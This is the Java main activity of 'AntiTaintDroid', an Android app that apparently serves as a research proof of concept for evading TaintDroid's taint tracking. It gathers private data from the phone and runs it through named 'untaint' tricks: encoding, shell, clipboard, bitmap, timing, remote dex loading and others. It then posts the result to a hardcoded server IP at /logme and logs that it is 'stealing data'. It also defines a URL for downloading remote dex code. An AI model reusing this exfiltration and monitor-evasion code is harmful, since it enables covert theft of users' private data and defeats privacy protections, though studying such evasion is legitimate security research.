package com.gsbabil.antitaintdroid;

import java.util.HashMap;
import java.util.Map;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.Application;
import android.content.DialogInterface;
import android.graphics.Bitmap;
import android.os.Bundle;
import android.os.StrictMode;
import android.os.Vibrator;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

class MyApp extends Application {
	public static String TAG = "AntiTaintDroid";
	public static String SCREENSHOT_FILENAME = "taintshot.jpg";
	public static String CAMERA_FILENAME = "camera.jpg";
	public static Bitmap CAMERA_BITMAP = null;
	public static String ACCELEROMETER = "";
	public static String HTTP_SUBMIT_URL = "http://203.143.166.137:8000/logme";
	public static String HTTP_OCR_URL = "http://203.143.166.137:8000/ocr";
	public static String REMOTE_DEX_URL = "http://203.143.166.137:8000/RemoteDex.apk";
	public static int TIMEOUT = 1500; // 1.5 seconds
	public static Activity context = null;
	public static int repeat = 1;
}

public class MainActivity extends Activity {
	public static UtilityFunctions utils = null;
	public static UntaintTricks untaint = null;


	public void onListItemClick(ListView lv, View view, int position, long id) {

		StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder()
				.detectNetwork() // or .detectAll() for all detectable problems
				.penaltyLog() // log message
				.permitNetwork() // permit Network access
				.build());

		for (int i = 0; i < MyApp.repeat; i++) {

			try {
				Thread.sleep(100);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}

			long startTime = System.nanoTime();

			Map<String, String> data = new HashMap<String, String>();
			String httpResponse = new String();
			String jsonRes = new String();
			final String clickItem = lv.getItemAtPosition(position).toString();

			/*
			 * data.put(clickItem, "NON-TAINTED"); String httpResponse =
			 * utils.httpSubmit(data); String jsonRes =
			 * utils.parseJson(httpResponse, "result"); // util.rawSubmit(data);
			 * if (jsonRes.contains("success")) {
			 * utils.statusUpdate("(success)\n"); } else {
			 * utils.statusUpdate("(failed)\n"); }
			 */

			data = utils.collectPrivateData();
			String trickName = "";

			if (clickItem == "Tainted Variable Test") {
				for (String key : data.keySet()) {
					String val = data.get(key);
					data.put(key, val);
				}
				trickName = "[TEST]";
				// Toast.makeText(
				// getApplicationContext(),
				// "Don't fret. TaintDroid should detect it and "
				// + "show an alert now.", Toast.LENGTH_LONG).show();
			}

			if (clickItem == "File Read/Write Test") {
				for (String key : data.keySet()) {
					String val = data.get(key);
					data.put(key, "FILE( " + untaint.fileTest(val, false)
							+ " )");
				}
				trickName = "[FILE]";
			}

			if (clickItem == "Simple Encoding Trick") {
				for (String key : data.keySet()) {
					String val = data.get(key);
					data.put(key, "ENCODE( " + untaint.encodingTrick(val)
							+ " )");
				}
				trickName = "[ENCODE]";
			}

			if (clickItem == "Shell Command Trick") {
				for (String key : data.keySet()) {
					String val = data.get(key);
					data.put(key, "SHELL( " + untaint.shellTrick(val) + " )");
				}
				trickName = "[SHELL]";
			}

			if (clickItem == "File+Shell Hybrid Trick") {
				for (String key : data.keySet()) {
					String val = data.get(key);
					data.put(key, "HYBRID( " + untaint.fileTest(val, true)
							+ " )");
				}
				trickName = "[HYBRID]";
			}

			if (clickItem == "Bitmap Cache Trick") {
				for (String key : data.keySet()) {
					String val = data.get(key);
					data.put(key, "BITMAP( " + untaint.bitmapCacheTrick(val)
							+ " )");
				}
				trickName = "[BITMAP]";
			}

			if (clickItem == "Timekeeper Trick") {
				for (String key : data.keySet()) {
					String val = data.get(key);
					data.put(key, "TIMER( " + untaint.timerTrick(val) + " )");
				}
				trickName = "[TIMER]";
			}

			if (clickItem == "Lookup Table Trick") {
				for (String key : data.keySet()) {
					String val = data.get(key);
					data.put(key, "LOOKUP( " + untaint.lookupTableTrick(val)
							+ " )");
				}
				trickName = "[LOOKUP]";
			}

			if (clickItem == "Count-to-X Trick") {
				for (String key : data.keySet()) {
					String val = data.get(key);
					data.put(key, "COUNT( " + untaint.countToXTrick(val) + " )");
				}
				trickName = "[COUNT]";
			}

			if (clickItem == "File Length Trick") {
				for (String key : data.keySet()) {
					String val = data.get(key);
					data.put(key, "FILELEN( " + untaint.fileLengthTrick(val)
							+ " )");
				}
				trickName = "[FILELEN]";
			}

			if (clickItem == "Clipboard Trick") {
				for (String key : data.keySet()) {
					String val = data.get(key);
					data.put(key, "CLIPBOARD( " + untaint.clipboardTrick(val)
							+ " )");
				}
				trickName = "[CLIPBOARD]";
			}

			if (clickItem == "Bitmap Pixel Trick") {
				for (String key : data.keySet()) {
					String val = data.get(key);
					data.put(key, "PIXEL( " + untaint.bitmapPixelTrick(val)
							+ " )");
				}
				trickName = "[PIXEL]";
			}

			if (clickItem == "Text Scaling Trick") {
				for (String key : data.keySet()) {
					String val = data.get(key);
					data.put(key, "TXTSCALE( " + untaint.textScalingTrick(val)
							+ " )");
				}
				trickName = "[TXTSCALE]";
			}

			if (clickItem == "Exception/Error Trick") {
				for (String key : data.keySet()) {
					String val = data.get(key);
					data.put(key, "EXCEPTION( " + untaint.exceptionTrick(val)
							+ " )");
				}
				trickName = "[EXCEPTION]";
			}

			if (clickItem == "Direct Buffer Trick") {
				for (String key : data.keySet()) {
					String val = data.get(key);
					data.put(key, "BUFFER( " + untaint.directBufferTrick(val)
							+ " )");
				}
				trickName = "[BUFFER]";
			}

			if (clickItem == "Remote Control Trick") {
				for (String key : data.keySet()) {
					String val = data.get(key);
					data.put(key, "RCTRL( " + untaint.remoteControlTrick(val)
							+ " )");
				}
				trickName = "[RCTRL]";
			}

			if (clickItem == "Remote Dex Trick") {
				for (String key : data.keySet()) {
					String val = data.get(key);
					data.put(key, "RDEX( " + untaint.remoteDexTrick(val) + " )");
				}
				trickName = "[RDEX]";
			}

			if (clickItem == "File LastModified Trick") {
				for (String key : data.keySet()) {
					String val = data.get(key);
					data.put(key, "LASTMOD( " + untaint.testTrick(val) + " )");
				}
				trickName = "[LASTMOD]";
			}

			long endTime = System.nanoTime();
			long trickWastedTime = endTime - startTime;

			int dataLen = 0;
			for (String key : data.keySet()) {
				String val = data.get(key);
				dataLen = dataLen + val.length();
			}

			Log.d(MyApp.TAG, "TRICK-TIMING: " + clickItem + " "
					+ trickWastedTime + " DATA-LEN: " + dataLen);

			utils.statusUpdate("● " + utils.timeNow() + " " + trickName
					+ " stealing data ... ");

			httpResponse = utils.httpSubmit(data);

			jsonRes = utils.parseJson(httpResponse, "result");
			// util.rawSubmit(data);
			if (jsonRes.contains("success")) {
				utils.statusUpdate("(success)\n");
			} else {
				utils.statusUpdate("(failed)\n");
			}

			/*
			 * data.clear(); data.put(clickItem, "NON-TAINTED"); httpResponse =
			 * utils.httpSubmit(data); jsonRes = utils.parseJson(httpResponse,
			 * "result"); // util.rawSubmit(data); if
			 * (jsonRes.contains("success")) {
			 * utils.statusUpdate("(success)\n"); } else {
			 * utils.statusUpdate("(failed)\n"); }
			 */

		} // iterate 100 times

	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		MenuInflater inflater = getMenuInflater();
		inflater.inflate(R.menu.main_menu, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		if (item.getItemId() == R.id.optionMenuExit) {
			Vibrator vib = (Vibrator) this.getSystemService(VIBRATOR_SERVICE);
			vib.vibrate(64);
			Toast.makeText(getApplicationContext(), "Goodbye!",
					Toast.LENGTH_SHORT).show();
			try {
				Thread.sleep(Toast.LENGTH_LONG);
			} catch (Throwable e) {
				Log.i(MyApp.TAG, e.getMessage().toString());
			}
			super.finish();

			return true;

		} else if (item.getItemId() == R.id.optionMenuClear) {
			TextView tv = (TextView) MyApp.context.findViewById(R.id.textview);
			tv.setText("");
		}
		else if (item.getItemId() == R.id.optionMenuSettings) {
			AlertDialog.Builder alert = new AlertDialog.Builder(MyApp.context);

			alert.setTitle("Specify Server Address");
			alert.setMessage("e.g. 203.143.173.14:80");

			final EditText input = new EditText(MyApp.context);
			input.setText(MyApp.HTTP_OCR_URL.replace("http://", "").replace(
					"/ocr", ""));

			alert.setView(input);

			alert.setPositiveButton("Ok",
					new DialogInterface.OnClickListener() {
						public void onClick(DialogInterface dialog,
								int whichButton) {
							String server = input.getText().toString();
							MyApp.HTTP_SUBMIT_URL = "http://" + server
									+ "/logme";
							MyApp.HTTP_OCR_URL = "http://" + server + "/ocr";
							utils.statusUpdate("● "
									+ utils.timeNow()
									+ " Server address changed to "
									+ MyApp.HTTP_OCR_URL.replace("http://", "")
											.replace("/ocr", "") + "\n");
						}
					});

			alert.setNegativeButton("Cancel",
					new DialogInterface.OnClickListener() {
						public void onClick(DialogInterface dialog,
								int whichButton) {
						}
					});

			alert.show();
			return true;

		}
		return false;
	}

	/** Called when the activity is first created. */
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		MyApp.context = this;
		MyApp.context.setTitle(R.string.app_title);
		
		utils = new UtilityFunctions();
		untaint = new UntaintTricks();

		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		
		TextView tv = (TextView) findViewById(R.id.textview);
		tv.setMovementMethod(new ScrollingMovementMethod());

		final ListView lv = (ListView) findViewById(R.id.listView);

		lv.setAdapter(new MyListViewAdapter(this, untaint.getTrickNames()));
		lv.setClickable(true);

		lv.setTextFilterEnabled(true);
		lv.setOnItemClickListener(new OnItemClickListener() {
			public void onItemClick(AdapterView<?> arg0, View view,
					int position, long id) {
				onListItemClick(lv, view, position, id);
			}
		});
	}
}
